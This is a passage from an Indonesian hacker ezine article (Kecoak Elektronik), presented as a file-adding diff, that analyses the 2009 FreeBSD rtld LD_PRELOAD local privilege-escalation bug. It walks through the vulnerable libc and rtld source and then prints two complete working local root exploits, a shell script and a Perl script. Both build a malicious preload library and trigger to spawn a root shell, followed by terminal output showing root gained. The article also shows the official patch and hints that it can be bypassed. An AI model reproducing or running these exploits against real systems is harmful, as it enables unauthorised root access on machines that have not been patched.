@@ -1,0 +1,582 @@
+Kecoak Elektronik Indonesia [ KEI ]
+http://www.kecoak-elektronik.net
+
+24 Hours A Day, 300/1200 Baud
+Presents...
+
+
+####################################################################
+TOKET - Terbitan Online Kecoak Elektronik
+Defending the classical hackers mind since 1995
+
+Publisher : http://www.kecoak-elektronik.net
+Contact   : staff@kecoak-elektronik.net
+####################################################################
+
+
+Subject   : RLTD FreeBSD Bugs Analysis 
+Writer    : elz of Kecoak Elektr0nik Indonesia
+Contact   : staff@kecoak-elektronik.net
+Style     : Unicode Transformation Format (UTF-8)
+                
+
+
+--[1]-- Kecoak Elektronik License
+
+
+Kecoak Elektronik secara aktif mendukung Blue Ribbon Campaign.
+Kami akan berusaha untuk menerbitkan semua informasi yang kami anggap
+patut diketahui, baik dokumen teks, artikel majalah, atau surat kabar.
+Seluruh kredit akan diberikan kepada sang pengarang.
+
+Kecoak Elektronik tidak bertanggung jawab atas tindakan orang lain.
+Informasi yang disajikan di situs ini adalah untuk tujuan pendidikan
+dan informasionil belaka. Jika anda memutuskan untuk mengejawantahkan
+dalam bentuk apapun informasi yang tersimpan di situs ini, anda
+melakukan atas keputusan sendiri, dan tidak seorangpun selain anda
+bertanggung jawab atas tindakan tersebut.
+
+Dipersilahkan untuk mengambil sebagian atau seluruh dari isi artikel
+yang kami terbitkan dengan tetap mencantumkan kredit atas pengarang
+dan Kecoak Elektronik sebagai penerbit online. Artikel yang dikutip
+atau diambil tidak dapat dipergunakan untuk kepentingan komersil.
+
+
+--[2]-- Behind the stories
+
+Beberapa waktu yang lalu, hampir bertepatan dengan waktu direleasenya
+FreeBSD 8.0, Para pengguna FreeBSD di kejutkan (Hiperbola mode:On) oleh
+postingan yang cukup menggemparkan yang dipublish di fulldisclosure
+mailling list[1] oleh Kingcope a.k.a Nikolaos Rangos. Beberapa blog
+yang bertema security secara serantak memberitakan dan ikut mempublish
+bugs ini, termasuk di blog kecoak elektronik[2].
+
+Seperti kemunculan berbagai public eXploit lainnya, Begitu pun kali 
+ini, semua para penggiat security, baik itu dari para script kiddie,
+cracker, black/white hat tentu akan meresponnya dengan berbagai 
+tindakan, yang menurut penulis sebagin besar adalah tindakan yang 
+berbuntut negative, and i dont like it..
+
+note:
+Yah, kegiatan kiddies memang menjengkelkan, mereka cuma tahu cara 
+menggunakan sesuatu tanpa tahu sebab musabab yang terjadi. Mereka
+selalu mau tampil dan muncul di permukaan tanpa mengerti apa yang
+mereka bicarakan... Fvck off!!!
+
+<bold>
+Tulisan ini tidak bermaksud untuk menjelaskan ulang tentang alur dari
+bugs tersebut, apalagi sangat banyak penjelasan yang lebih bagus dari
+apa yang saya jelaskan disini. Namun saya belum melihat tulisan dalam
+bahasa indonesia yang menjelaskan alur dari RTLD bugs ini secara
+mendalam, selain dari itu tulisan ini lebih ditujukan buat para
+penggiat security di tanah air terutama bagi para pendatang baru agar
+dapat memahami secara mendalam tentang suatu bugs dan bagaimana
+kelemahan tersebut bisa terexploitasi sehingga bisa dijadikan sebagai
+senjata dalam proses privilege escalation. Intinya disini adalah,
+silahkan mengambil konsep dari tulisannya saja, karena saya yakin, pada
+saat tulisan ini di release, hampir bisa dipastikan bahwa sebagian besar
+server FreeBSD sudah terpatch dengan benar.
+</bold>
+
+Ok, lets move boy..
+
+--[3]-- The Bugs
+ 
+Vulnerability yang diakui sudah ditemukan oleh stealth[3] beberapa
+waktu sebelum di muat di FD-List itu memanfaatkan bugs yang terdapat
+pada Run-Time Link-Editor, cacatnya terpadat pada code yang bisa anda 
+lihat pada path /usr/src/libexec/rtld-elf/rtld.c pada sistem FreeBSD 
+anda. Berikut screenshoot-nya (diambil dari FreeBSD 8.0-Release):
+
+--// func_ptr_type_rtld Routines \\
+
+func_ptr_type
+_rtld(Elf_Addr *sp, func_ptr_type *exit_proc, Obj_Entry **objp)
+	{
+	    Elf_Auxinfo *aux_info[AT_COUNT];
+	    int i;
+	  ...
+	    trust = !issetugid();
+	  ...
+	    /*
+	     * If the process is tainted, then we un-set the dangerous 
+	     * environment variables.  The process will be marked as 
+	     * tainted until setuid(2) is called.  If any child process 
+	     * calls setuid(2) we do not want any future processes to 
+	     * honor the potentially un-safe variables.
+	     */
+	    if (!trust) {
+	        unsetenv(LD_ "PRELOAD");
+	        unsetenv(LD_ "LIBMAP");
+	        unsetenv(LD_ "LIBRARY_PATH");
+	        unsetenv(LD_ "LIBMAP_DISABLE");
+	        unsetenv(LD_ "DEBUG");
+	        unsetenv(LD_ "ELF_HINTS_PATH");
+	    }
+	  ...
+	    /* Return the exit procedure and the program entry point. */
+	    *exit_proc = rtld_exit;
+	    *objp = obj_main;
+	    return (func_ptr_type) obj_main->entry;
+	} 
+--
+
+Pada dasarnya ketika LD_PRELOAD dipanggil, maka kernel akan di-
+instruksikan untuk meload routines tertentu pada program atau objek
+yang bisa ditentukan sendiri oleh user. Fungsi func_ptr_type_rtld()
+diatas berguna ketika user membuild sebuah share library, maka akan
+dilakukan pengecekan terhadap binary yang memiliki flag setugid. Nah,
+pada kondisi dimana terdapat object atau binary yang memiliki flag
+setugid maka akan di ignore dengan fungsi unsetenv. Pada dasarnya fungsi
+ini dibuat untuk alasan security, dimana alur dari fungsi tersebut kira-
+kira seperti ini: Jika kondisinya benar (!trust) maka fungsi ini akan
+mendisable variable berbahaya seperti LD_PRELOAD dengan fungsi unsetenv. 
+
+Persoalannya adalah return value dari fungsi unsetenv() ini tidak di
+check sama sekali. Sekarang mari kita lihat fungsi dari unsetenv(),
+screenshoot-nya seperti berikut: 
+
+--// unsetenv Routine \\--
+
+/*
+ * Unset variable with the same name by flagging it as inactive.  
+ * No variable is ever freed.
+ */
+	int
+	unsetenv(const char *name)
+	{
+	    int envNdx;
+	    size_t nameLen;
+	 
+	    /* Check for malformed name. */
+	    if (name == NULL || (nameLen = __strleneq(name)) == 0) {
+	        errno = EINVAL;
+	        return (-1);
+	    }
+	 
+	    /* Initialize environment. */
+	    if (__merge_environ() == -1 || (envVars == NULL && \
+					__build_env() == -1))
+	        return (-1);
+	 
+	    /* Deactivate specified variable. */
+	    envNdx = envVarsTotal - 1;
+	    if (__findenv(name, nameLen, &envNdx, true) != NULL) {
+	        envVars[envNdx].active = false;
+	        if (envVars[envNdx].putenv)
+	            __remove_putenv(envNdx);
+	        __rebuild_environ(envActive - 1);
+	    }
+	 
+	    return (0);
+}
+--
+
+Fungsi unsetenv() ini akan melakukan pengecekan terhadap penamaan file
+dan panjang dari nama file tersebut, ketika name file sama dengan NULL
+dan nameLen = __strleneq(name) sama dengan NULL, maka fungsi unsetenv()
+akan mengembalikan nilai EINVAL. Pada baris berikutnya, fungsi ini
+akan menginisialisasi environmentnya dengan subroutine __merge_environ
+dan __build_env. Pada eXploit yang di develop oleh stealth[4], fungsi
+__merge_environ inilah yang menjadi penyebap utama kenapa bugs ini 
+bisa di exploitasi. Untuk jelasnya mari kita lihat screenshootnya:
+
+--// __merge_environ subroutines \\--
+
+static int
+__merge_environ(void)
+{
+        char **env;
+        char *equals;
+
+        /* 
+         * Internally-built environ has been replaced or cleared
+	 * (detected by using the count of active variables against 
+	 * a NULL as the first value in environ).  Clean up everything.
+         */
+        if (intEnviron != NULL && (environ != intEnviron ||
+		(envActive > 0 && environ[0] == NULL))) {
+                /* Deactivate all environment variables. */
+                if (envActive > 0) {
+                        origEnviron = NULL;
+                        __clean_env(false);
+                }
+
+                /*
+                 * Insert new environ into existing, yet deactivated,
+                 * environment array.
+                 */
+                origEnviron = environ;
+                if (origEnviron != NULL)
+                        for (env = origEnviron; *env != NULL; env++) {
+                                if ((equals = strchr(*env, '=')) == NULL) {
+                                     __env_warnx(CorruptEnvValueMsg, *env,
+                                            strlen(*env));
+                                        errno = EFAULT;
+                                        return (-1);
+                                }
+                                if (__setenv(*env, equals - *env, equals + 1,
+                                    1) == -1)
+                                        return (-1);
+                        }
+        }
+
+        return (0);
+}
+--
+
+Pada fungsi __merge_environ tersebut akan melakukan pengecekan terhadap
+environment array dari objek yang akan di load, ketika tidak terdapat
+karakter "=", maka akan mengembalikan nilai -1 atau EXIT_FAILURE. Nilai
+kembalian dari fungsi __merge_environ ini yang akan diteruskan ke fungsi
+unsetenv().
+
+Kalau kita kembali melihat fungsi unsetenv(), maka proses berikutnya
+adalah menginisialisasi varible envNdx ke dalam fungsi __findenv(),
+dimana index dari variable tersebut digunakan untuk menghapus nilai
+dari variable envVars dari array. Sekarang mari kita lihat dan
+perhatikan fungsi __findenv():
+
+--// __findendev subroutines \\--
+
+static inline char *
+__findenv(const char *name, size_t nameLen, int *envNdx, bool onlyActive)
+{
+	int ndx;
+
+	/*
+	 * Find environment variable from end of array
+	 * (more likely to be active).  A variable created 
+	 * by putenv is always active or it is not tracked
+	 * in the array.
+	 */
+	for (ndx = *envNdx; ndx >= 0; ndx--)
+		if (envVars[ndx].putenv){
+			if (strncmpeq(envVars[ndx].name, name, nameLen)){
+				*envNdx = ndx;
+				return (envVars[ndx].name + nameLen +
+				    sizeof ("=") - 1);
+			}
+		} else if ((!onlyActive || envVars[ndx].active) &&
+		    (envVars[ndx].nameLen == nameLen &&
+		    strncmpeq(envVars[ndx].name, name, nameLen))){
+			*envNdx = ndx;
+			return (envVars[ndx].value);
+		}
+
+	return (NULL);
+}
+--
+
+Ketika fungsi __findenv() mengembalikan nilai error, maka fungsi
+unsetenv() akan keluar dengan kondisi error pula, oleh karena fungsi
+_rtld() tidak melakukan pengecekan terhadap nilai kembalian pada saat 
+menginisialisasi variable dengan fungsi unsetenv() maka bisa dipastikan
+bahwa variable yang memiliki flag setugid yang gagal di remove oleh
+unsetenv() akan tetap berada pada elemen array sehingga tetap bisa
+dimasukan kedalam environment LD_PRELOAD.
+
+Kondisi seperti diatas-lah yang menyebabkan bugs ini cukup berbahaya,
+karena dengan melakukan LD_PRELOAD dengan variable yang memiliki flag
+setugid seperti ping atau su maka kita secara langsung bisa mendapatkan
+akses setingkat dengan root. How it works? mari kita lihat bagaimana
+cara pemanfaatan bugs ini untuk melakukan instant privileges escalation.
+
+--[4]-- The Exp0itation
+
+Dengan kondisi seperti yang digambarkan sebelumnya, seorang attacker
+akan dengan mudah mendapatkan access root hanya dengan memberi trigger
+sederhana dengan pola kira-kira seperti berikut:
+
+	- Membuat sebuah relocatable file yang nantinya akan di load ke
+	  dalam envirenment LD_PRELOAD yang isinya mensetup variable
+	  environ ke NULL.	
+	- Melakukan setting terhadap environment array untuk mentrigger
+	  kegagalan unsetenv() dengan relocatable file yang telah kita
+	  siapkan.
+	- Meng-eksekusi binary yang memiliki flag setugid seperti ping
+	  atau su.
+	- Berikutnya membuka atau shell dengan privileges setingkat dengan
+	  root.
+
+Alur algoritma sederhana diatas di-implementasikan oleh 2 public exploit
+yang beredar pada saat ini yaitu versi kcope[1] dan versi stealth[4].
+Tidak ada perbedaan yang terlalu jauh diantara keduanya, kcope membuat-
+nya secara lebih sederhana, sedangkan stealth merakit exploitnya dengan
+tingkat reliable yang lebih baik.
+
+Untuk pertama kali saya akan menjelaskan alur dari exploit yang dibuat
+oleh kcope yang tentu anda-anda semua sudah pernah mencobanya. Mari kita 
+lihat source code dari exploit-nya:
+
+--// RTLD Exploit by Kcope \\--
+
+#!/bin/sh
+echo ** FreeBSD local r00t zeroday
+echo by Kingcope
+echo November 2009
+cat > env.c << _EOF
+#include <stdio.h>
+
+main() {
+        extern char **environ;
+        environ = (char**)malloc(8096);
+
+        environ[0] = (char*)malloc(1024);
+        environ[1] = (char*)malloc(1024);
+        strcpy(environ[1], "LD_PRELOAD=/tmp/w00t.so.1.0");
+
+        execl("/sbin/ping", "ping", 0);
+}
+_EOF
+gcc env.c -o env
+cat > program.c << _EOF
+#include <unistd.h>
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+
+void _init() {
+        extern char **environ;
+        environ=NULL;
+        system("echo ALEX-ALEX;/bin/sh");
+}
+_EOF
+gcc -o program.o -c program.c -fPIC
+gcc -shared -Wl,-soname,w00t.so.1 -o w00t.so.1.0 program.o -nostartfiles
+cp w00t.so.1.0 /tmp/w00t.so.1.0
+./env
+--
+
+Seperti yang anda lihat diatas, Source code dari exploit tersebut
+terdiri dari 2 code program dalam bahasa C, yaitu program.c dan env.c.
+program.c adalah sebuah library yang mengeset nilai dari variable
+environ ke NULL dan kemudian menjalankan command system, dalam hal ini
+echo dan /bin/sh (echo hanya sekedar untuk gaya-gayaan). Kenapa perlu
+variable environ di set ke NULL, hal tersebut dilakukan agar kita bisa
+mengcopy LD_PRELOAD environment ke heap. Code program kedua adalah
+env.c, dimana code tersebut akan mengeset uninitialized heap dengan
+"LD_PRELOAD=/tmp/w00t.so.1.0", kemudian akan mengeksuksi ping yang
+memiliki flag setugid. Karena kegagalan unsetenv() dalam menghapus
+binary yang memiliki flag setugid, maka pada saat kita mengeksekusi
+/bin/sh dengan root privileges, tentu yang muncul adalah shell root.
+Bingo!!!
+
+Exploit kedua yang mengeksploitasi rtld bugs ini adalah exploit buatan
+stealth. Exploit ini secara algoritma hampir sama dengan exploit yang
+direlease oleh kcope, sedikit perbedaan ada pada tingkat kehandalan
+dalam membangkitkan rootshell.
+
+--// RTLD exploit by Stealth \\--
+
+...
+sub drop_boomsh
+{
+	open(O,">/tmp/boomsh.c") or die $!;
+	print O<<_EOB_;
+#include <stdio.h>
+#include <sys/types.h>
+#include <unistd.h>
+
+int main()
+{
+	char *a[]={"/bin/sh", NULL };
+	char *b[]={"/usr/local/bin/bash", NULL };
+
+	setuid(0); setgid(0);
+	unlink("/tmp/trigger");
+	unlink("/tmp/trigger.c");
+	unlink("/tmp/te.so");
+	unlink("/tmp/te.c");
+	unlink("/tmp/boomsh.c");
+	execve(*b, b, NULL);
+	execve(*a, a, NULL);
+}
+_EOB_
+	close O;
+	system("cc /tmp/boomsh.c -o /tmp/boomsh");
+}
+
+sub drop_trigger
+{
+	open(O,">/tmp/trigger.c") or die $!;
+	print O<<_EOT_;
+#include <stdio.h>
+#include <stdlib.h>
+
+int main()
+{
+	char *a[]={"/sbin/ping", NULL};
+	char *e[]={"LD_PRELOAD=/tmp/te.so", "YYY", NULL};
+	execve(*a,a,e);
+}
+_EOT_
+	close O;
+	system("cc /tmp/trigger.c -o /tmp/trigger");
+}
+
+sub drop_teso
+{
+	open(O, ">/tmp/te.c") or die $!;
+	print O<<_EOS_;
+#include <sys/stat.h>
+#include <unistd.h>
+
+void _init()
+{
+	chown("/tmp/boomsh", 0, 0);
+	chmod("/tmp/boomsh", 04755);
+}
+_EOS_
+	close O;
+	system("gcc -fPIC -shared -nostartfiles /tmp/te.c -o /tmp/te.so");
+}
+
+print "FreeBSD rtld local root exploit. Need gcc installed. Trying...\n";
+drop_boomsh();
+drop_teso();
+drop_trigger();
+system("/tmp/trigger");
+exec "/tmp/boomsh";
+print "Failed!\n";
+---
+
+Exploit yang dibinding dalam bahasa perl diatas terdiri dari 3 code
+program C yaitu boomsh.c, trigger.c dan te.c. Tidak perlu dijelaskan
+ulang karena hampir sama dengan exploit sebelumnya, cuma disini stealth
+melakukan setting setuid dan setgid ke 0 sebelum membangkitkan shell.
+
+Kenapa penulis mengatakan bahwa expolit versi stealth lebih handal?
+penjelasannya bisa anda perhatikan dengan PoC berikut:
+
+--// PoC \\--
+
+[elz@kecoak-elektr0nik ~]$ uname -rs
+FreeBSD 8.0-RELEASE
+[elz@kecoak-elektr0nik ~]$ sh newsploit.sh
+FreeBSD local r00t zeroday
+by Kingcope
+November 2009
+/libexec/ld-elf.so.1: environment corrupt; missing value for
+/libexec/ld-elf.so.1: environment corrupt; missing value for
+/libexec/ld-elf.so.1: environment corrupt; missing value for
+/libexec/ld-elf.so.1: environment corrupt; missing value for
+/libexec/ld-elf.so.1: environment corrupt; missing value for
+/libexec/ld-elf.so.1: environment corrupt; missing value for
+# id
+uid=1001(elz) gid=0(wheel) euid=0(root) groups=0(wheel)
+# su
+Password:
+su: Sorry
+# exit
+...
+[elz@kecoak-elektr0nik ~]$ perl fbsd-rtld-full-package
+FreeBSD rtld local root exploit. Need gcc installed. Trying...
+/libexec/ld-elf.so.1: environment corrupt; missing value for YYY
+/libexec/ld-elf.so.1: environment corrupt; missing value for YYY
+/libexec/ld-elf.so.1: environment corrupt; missing value for YYY
+/libexec/ld-elf.so.1: environment corrupt; missing value for YYY
+/libexec/ld-elf.so.1: environment corrupt; missing value for YYY
+/libexec/ld-elf.so.1: environment corrupt; missing value for YYY
+...
+[root@kecoak-elektr0nik /usr/home/elz]# id
+uid=0(root) gid=0(wheel) groups=0(wheel)
+[root@kecoak-elektr0nik /usr/home/elz]# su
+kecoak-elektr0nik#
+---
+
+The End.
+
+--[5]-- Patch!
+
+Keterlambatan dari FreeBSD Security Team dalam merespon issue RTLD ini
+mendapat tanggapan yang tidak baik dari para penggiat security. Lebih
+dari 24 jam RTLD bugs ini dibiarkan begitu saja menjadi mainan script
+kiddie, walaupun cperciva sudah merelease un-official patch[5]. Dan
+yang membuat saya secara pribadi sedikit bingung adalah ketika FreeBSD
+Security Team merelease patch secara resmi[6], tidak ada perbedaan sama
+sekali dengan versi un-official buatan cperciva. Okey, kita tidak usah
+membahas kebingugan yang saya alami, mari kita lihat patch yang di-
+release oleh FreeBSD Security Team:
+
+--// RTLD Patch (for FreeBSD 8.0)\\--
+
+Index: libexec/rtld-elf/rtld.c
+===================================================================
+--- libexec/rtld-elf/rtld.c	(revision 199978)
++++ libexec/rtld-elf/rtld.c	(revision 199979)
+@@ -366,12 +366,12 @@
+      * future processes to honor the potentially un-safe variables.
+      */
+     if (!trust) {
+-        unsetenv(LD_ "PRELOAD");
+-        unsetenv(LD_ "LIBMAP");
+-        unsetenv(LD_ "LIBRARY_PATH");
+-        unsetenv(LD_ "LIBMAP_DISABLE");
+-        unsetenv(LD_ "DEBUG");
+-        unsetenv(LD_ "ELF_HINTS_PATH");
++        if (unsetenv(LD_ "PRELOAD") || unsetenv(LD_ "LIBMAP") ||
++	    unsetenv(LD_ "LIBRARY_PATH") || unsetenv(LD_ "LIBMAP_DISABLE") ||
++	    unsetenv(LD_ "DEBUG") || unsetenv(LD_ "ELF_HINTS_PATH")) {
++		_rtld_error("environment corrupt; aborting");
++		die();
++	}
+     }
+     ld_debug = getenv(LD_ "DEBUG");
+     libmap_disable = getenv(LD_ "LIBMAP_DISABLE") != NULL;
+--
+
+Keep on mind, Patch diatas ditujukan buat FreeBSD versi 8.0, untuk
+FreeBSD versi 7.x anda harus menghilangkan variable ELF_HINTS_PATH,
+karena pada versi 7.x variable tersebut tidak disupport. 
+
+Kembali ke patch diatas, FreeBSD Security Team hanya melakukan
+pengecekan terhadap nilai kembalian dari fungsi unsetenv() seperti ini..
+
+if (unsetenv(LD_ "PRELOAD") ...)){
+	_rtld_error("environment corrupt; aborting");
+	die();
+
+Pengecekan dilakukan terhadap pesan kesalahan yang di berikan oleh
+fungsi _rtld_error(). Ketika pesan kesalahan berisi string "environment
+corrupt; aborting" maka proses akan dihentikan dengan fungsi die(). 
+
+Apakah anda merasa sudah aman ketika telah melakukan patching dengan
+patch tersebut? Mudah-mudahan tidak, karena sampai saat ini, 
+permasalahan mendasar yang menjadi kelemahan utama dari rtld bugs
+tersebut belum di sentuh sama sekali oleh FreeBSD Security Team. Apakah
+ada cara lain untuk melakukan bypass terhadap patch diatas? Please open
+your mind before!
+
+--[6]-- Close Words
+
+So many ways to hack human stupidity out there. So many beautiful thing
+you need to know about hacking world. So never say you dont know what do
+you want to do with your fucking box. Hails hackerz! Hack till the end! 
+
+Kecoak Elektronik s0ldier!
+
+Electr0nic Zombie
+
+note:
+
+Landasan utama dari tulisan ini mengacu pada tulisan yang dimuat di blog
+xorl[7].
+
+greetz:
+	"Special Thanks to Xorl for great explanation on this issue,
+	you are rock man!"
+
+--[7]-- Link and Reference
+
+[1]http://seclists.org/fulldisclosure/2009/Nov/371
+[2]http://www.kecoak-elektronik.net/log/2009/12/01/freebsd-rtld-0day-exploit/
+[3]http://c-skills.blogspot.com/2009/11/always-check-return-value.html
+[4]http://stealth.openwall.net/xSports/fbsd-rtld-full-package
+[5]http://people.freebsd.org/~cperciva/rtld.patch
+[6]http://security.freebsd.org/advisories/FreeBSD-SA-09:16.rtld.asc
+[7]http://xorl.wordpress.com/2009/12/01/freebsd-ld_preload-security-bypass/
+
+-----------------------------------------------------------------------
+Copyleft Unreserved by Law 1995 - 2010 Kecoak Elektronik Indonesia
+http://www.kecoak-elektronik.net
